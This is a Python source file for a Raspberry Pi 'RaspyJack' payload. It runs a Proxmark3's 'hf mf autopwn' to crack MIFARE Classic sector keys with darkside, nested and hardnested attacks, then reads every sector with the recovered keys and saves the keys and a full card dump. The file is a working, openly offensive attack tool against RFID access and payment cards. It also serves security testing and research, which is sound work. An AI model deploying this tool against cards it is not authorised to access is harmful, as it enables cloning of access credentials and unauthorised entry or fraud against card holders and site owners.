#!/usr/bin/env python3
"""
RaspyJack Payload -- PM3 Autopwn
==================================
Auto-crack MIFARE Classic keys using Proxmark3
darkside/nested/hardnested attacks.

Requires: Proxmark3 (Easy, RDV2, or RDV4).

Controls:
  OK         Start autopwn
  UP/DOWN    Scroll results
  KEY2       Save dump
  KEY3       Exit
"""

import os
import re
import sys
import time

sys.path.append(os.path.abspath(os.path.join(__file__, "..", "..", "..")))

import RPi.GPIO as GPIO
import LCD_1in44
import LCD_Config
from PIL import Image
from payloads._display_helper import ScaledDraw, scaled_font
from payloads._input_helper import get_button
from payloads.nfc_rfid._nfc_driver import auto_detect, PM3Driver, is_classic
from payloads.nfc_rfid._nfc_cards import save_dump
from payloads.nfc_rfid._nfc_keys import save_keymap

PINS = {
    "UP": 6, "DOWN": 19, "LEFT": 5, "RIGHT": 26,
    "OK": 13, "KEY1": 21, "KEY2": 20, "KEY3": 16,
}
WIDTH, HEIGHT = LCD_1in44.LCD_WIDTH, LCD_1in44.LCD_HEIGHT
DEBOUNCE = 0.18
_last_btn = 0


def _btn():
    global _last_btn
    b = get_button(PINS, GPIO)
    now = time.time()
    if b and now - _last_btn < DEBOUNCE:
        return None
    if b:
        _last_btn = now
    return b


def _parse_autopwn(output):
    """Parse autopwn output into sector key results."""
    sectors = {}
    for m in re.finditer(
        r"Sector\s*(\d+)\s*.*?(?:Found|valid)\s+Key\s*([AB])\s*[:=]\s*([0-9A-Fa-f]{12})",
        output, re.IGNORECASE,
    ):
        sec = int(m.group(1))
        kt = m.group(2).upper()
        key = m.group(3).upper()
        if sec not in sectors:
            sectors[sec] = {"sector": sec, "key": key, "key_type": kt, "cracked": True}

    for m in re.finditer(
        r"found valid key\s*[:=]?\s*([0-9A-Fa-f]{12})", output, re.IGNORECASE
    ):
        key = m.group(1).upper()
        for sec in range(40):
            if sec not in sectors:
                sectors[sec] = {"sector": sec, "key": key, "key_type": "A", "cracked": True}
                break

    attacks = set()
    for atk in ["darkside", "nested", "hardnested", "static", "dictionary"]:
        if atk in output.lower():
            attacks.add(atk)

    return sectors, attacks


def _full_dump(drv, card, sector_keys):
    """Read all sectors using discovered keys."""
    n_sectors = 40 if "4K" in card.card_type else 16
    dump_sectors = []
    for sec in range(n_sectors):
        info = sector_keys.get(sec)
        blocks = []
        if info and info.get("cracked"):
            key_hex = info["key"]
            kt = "-a" if info["key_type"] == "A" else "-b"
            first_block = sec * 4
            for b in range(4):
                out = drv.command(f"hf mf rdbl --blk {first_block + b} {kt} -k {key_hex}")
                m = re.search(
                    r"\|\s*((?:[0-9A-Fa-f]{2}\s+){15}[0-9A-Fa-f]{2})\s*\|", out or ""
                )
                if m:
                    blocks.append(m.group(1).replace(" ", ""))
                else:
                    blocks.append("?" * 32)
        dump_sectors.append({
            "sector": sec,
            "blocks": blocks,
            "key": info["key"] if info else "",
            "key_type": info["key_type"] if info else "",
        })
    return {"sectors": dump_sectors}


def main():
    GPIO.setmode(GPIO.BCM)
    for pin in PINS.values():
        GPIO.setup(pin, GPIO.IN, pull_up_down=GPIO.PUD_UP)

    LCD_Config.GPIO_Init()
    lcd = LCD_1in44.LCD()
    lcd.LCD_Init(LCD_1in44.SCAN_DIR_DFT)
    lcd.LCD_Clear()

    font = scaled_font(10)
    font_sm = scaled_font(9)
    font_xs = scaled_font(9)

    img = Image.new("RGB", (WIDTH, HEIGHT), "black")
    d = ScaledDraw(img)
    d.text((4, 50), "Detecting reader...", font=font_sm, fill="#FFAA00")
    lcd.LCD_ShowImage(img, 0, 0)

    drv, drv_desc = auto_detect()

    if not isinstance(drv, PM3Driver):
        img = Image.new("RGB", (WIDTH, HEIGHT), "black")
        d = ScaledDraw(img)
        d.text((4, 40), "PM3 Required", font=font, fill="#FF4444")
        d.text((4, 60), drv_desc[:22] if drv else "No reader", font=font_sm, fill="#888")
        d.text((4, 80), "Connect a Proxmark3", font=font_xs, fill="#666")
        lcd.LCD_ShowImage(img, 0, 0)
        time.sleep(3)
        GPIO.cleanup()
        return 1

    status = drv_desc
    sector_keys = {}
    attacks_used = set()
    card = None
    card_data = None
    scroll = 0
    running = False

    try:
        while True:
            btn = _btn()
            if btn == "KEY3":
                break

            if btn == "OK" and not running:
                img = Image.new("RGB", (WIDTH, HEIGHT), "black")
                d = ScaledDraw(img)
                d.text((4, 50), "Place card...", font=font_sm, fill="#FFAA00")
                lcd.LCD_ShowImage(img, 0, 0)

                card = drv.read_passive_target(timeout=5.0)
                if not card or not is_classic(card):
                    status = "Not Classic" if card else "No card"
                    card = None
                    continue

                running = True
                sector_keys = {}
                attacks_used = set()
                card_data = None
                start_time = time.time()

                img = Image.new("RGB", (WIDTH, HEIGHT), "black")
                d = ScaledDraw(img)
                d.rectangle((0, 0, 127, 14), fill="#111")
                d.text((2, 2), "AUTOPWN", font=font_sm, fill="#FF00FF")
                d.text((4, 20), f"UID: {card.uid_hex}", font=font_sm, fill="#00FF00")
                d.text((4, 34), card.card_type, font=font_xs, fill="#ccc")
                d.text((4, 52), "Cracking keys...", font=font_sm, fill="#FFAA00")
                d.text((4, 68), "darkside+nested+", font=font_xs, fill="#888")
                d.text((4, 80), "hardnested attacks", font=font_xs, fill="#888")
                d.text((4, 100), "This may take 1-2 min", font=font_xs, fill="#555")
                lcd.LCD_ShowImage(img, 0, 0)

                out = drv.command("hf mf autopwn", timeout=120.0)
                elapsed = int(time.time() - start_time)

                if out:
                    sector_keys, attacks_used = _parse_autopwn(out)

                n_sectors = 40 if "4K" in card.card_type else 16
                cracked = len(sector_keys)

                if cracked > 0:
                    img = Image.new("RGB", (WIDTH, HEIGHT), "black")
                    d = ScaledDraw(img)
                    d.rectangle((0, 0, 127, 14), fill="#111")
                    d.text((2, 2), "DUMPING", font=font_sm, fill="#FF00FF")
                    d.text((4, 30), f"{cracked}/{n_sectors} keys found", font=font_sm, fill="#00FF00")
                    d.text((4, 50), "Reading sectors...", font=font_sm, fill="#FFAA00")
                    lcd.LCD_ShowImage(img, 0, 0)

                    card_data = _full_dump(drv, card, sector_keys)

                    keymap = [
                        {"sector": s, "key": v["key"], "key_type": v["key_type"], "cracked": True}
                        for s, v in sorted(sector_keys.items())
                    ]
                    save_keymap(card.uid_hex, keymap)

                atk_str = ",".join(sorted(attacks_used))[:16] if attacks_used else "auto"
                status = f"{cracked}/{n_sectors} cracked {elapsed}s [{atk_str}]"
                scroll = 0
                running = False

            if btn == "KEY2" and card and card_data:
                fname = save_dump(card.uid, card.card_type, card_data)
                status = f"Saved: {fname[:16]}"

            if btn == "UP":
                scroll = max(0, scroll - 1)
            elif btn == "DOWN":
                scroll += 1

            if not running:
                img = Image.new("RGB", (WIDTH, HEIGHT), "black")
                d = ScaledDraw(img)
                d.rectangle((0, 0, 127, 14), fill="#111")
                d.text((2, 2), "PM3 AUTOPWN", font=font_sm, fill="#FF00FF")

                y = 18
                d.text((2, y), status[:24], font=font_sm, fill="#FFAA00")
                y += 13

                if card and sector_keys:
                    d.text((2, y), f"UID: {card.uid_hex}", font=font_xs, fill="#00FF00")
                    y += 11

                    n_sectors = 40 if "4K" in card.card_type else 16
                    cols = 4 if n_sectors <= 16 else 8
                    cell = min(12, 80 // cols)
                    gx = (127 - cols * cell) // 2
                    gy = y
                    for si in range(n_sectors):
                        cx = gx + (si % cols) * cell
                        cy = gy + (si // cols) * cell
                        col = "#00FF00" if si in sector_keys else "#FF4444"
                        d.rectangle((cx, cy, cx + cell - 2, cy + cell - 2), fill=col)
                    y = gy + ((n_sectors + cols - 1) // cols) * cell + 4

                    sorted_keys = sorted(sector_keys.items())
                    for i in range(scroll, min(len(sorted_keys), scroll + 3)):
                        sec_num, info = sorted_keys[i]
                        if y > 108:
                            break
                        d.text(
                            (2, y),
                            f"S{sec_num:02d} {info['key']} ({info['key_type']})",
                            font=font_xs, fill="#00FF00",
                        )
                        y += 10
                else:
                    d.text((4, 50), "Press OK to start", font=font_sm, fill="#666")
                    d.text((4, 68), "Requires MIFARE Classic", font=font_xs, fill="#888")

                d.rectangle((0, 116, 127, 127), fill="#111")
                d.text((2, 117), "OK:Start K2:Save K3:X", font=font_xs, fill="#666")
                lcd.LCD_ShowImage(img, 0, 0)

            time.sleep(0.03)

    finally:
        if drv:
            drv.close()
        try:
            lcd.LCD_Clear()
        except Exception:
            pass
        GPIO.cleanup()

    return 0


if __name__ == "__main__":
    raise SystemExit(main())
